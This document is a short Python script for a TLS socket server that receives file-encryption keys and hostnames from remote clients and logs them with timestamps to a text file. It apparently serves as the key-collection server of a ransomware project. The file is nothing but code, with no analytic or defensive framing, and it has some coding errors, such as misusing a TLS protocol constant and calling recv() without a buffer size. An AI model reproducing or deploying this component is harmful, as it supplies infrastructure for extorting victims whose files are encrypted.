# import
import socket, ssl
from datetime import datetime
# Variables :
host = ""
port = 4000


def store_key(key, hostname):
    """
    Strore the key on a remote server with the hostame
    :param key -- key to encrypt files:
    """
    # Variables
    filename = "key_file.txt"
    # Adding key, hostname, date and schedule in a file
    with open(filename, 'a+') as key_file:
        key_file.write("\n" + key + "\t" + hostname + "\t" + datetime.now().strftime("%d-%m-%Y %H:%M:%S"))


# Create a socket
sock = socket.socket()
sock.bind((host, port))
sock.listen(1)

# Create and configure the SSL/TLS socket
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
# Loading the certificate (created with OpenSSL)
context.load_cert_chain(certfile="cert.pem", keyfile="cert.pem")
context.options |= ssl.PROTOCOL_TLSv1_2

# Server listening
while True:
    new_socket, from_addr = sock.accept()
    sslSocket = context.wrap_socket(new_socket, server_side=True)
    # Receive the key and hostname
    key = sslSocket.recv().decode()
    hostname = sslSocket.recv().decode()
    # Call the "store_key()" function
    store_key(key, hostname)